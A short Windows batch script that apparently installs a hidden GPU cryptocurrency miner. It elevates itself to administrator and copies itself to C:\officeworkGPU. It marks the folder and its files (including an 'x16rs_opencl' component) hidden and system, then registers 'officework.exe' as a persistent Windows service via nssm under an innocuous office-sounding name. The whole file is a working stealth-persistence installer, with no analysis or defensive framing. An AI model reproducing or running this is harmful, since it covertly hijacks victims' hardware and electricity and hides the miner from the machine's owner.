@echo off
chcp 65001 > nul

openfiles >nul 2>&1
if %errorlevel% neq 0 (
    
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

rem 获取批处理文件的存放路径
set script_dir=%~dp0

rem 切换到批处理文件的存放路径
cd /d %script_dir%

set current_dir=%cd%


set target_dir=C:\officeworkGPU



if not exist "%target_dir%" (
    mkdir "%target_dir%"
)

xcopy "%script_dir%" "%target_dir%" /E /H /C /I /Y


attrib +h +s "%target_dir%"
cd /d %target_dir%
attrib +h +s  *.*
attrib +h +s  "%target_dir%/nssm"
attrib +h +s  "%target_dir%/x16rs_opencl"

set cd_target_dir=%target_dir%\nssm\win64
set exe_name=officework.exe
set full_path=%target_dir%\%exe_name%

cd /d %cd_target_dir%



nssm install officeworkGPU %full_path%

nssm start officeworkGPU


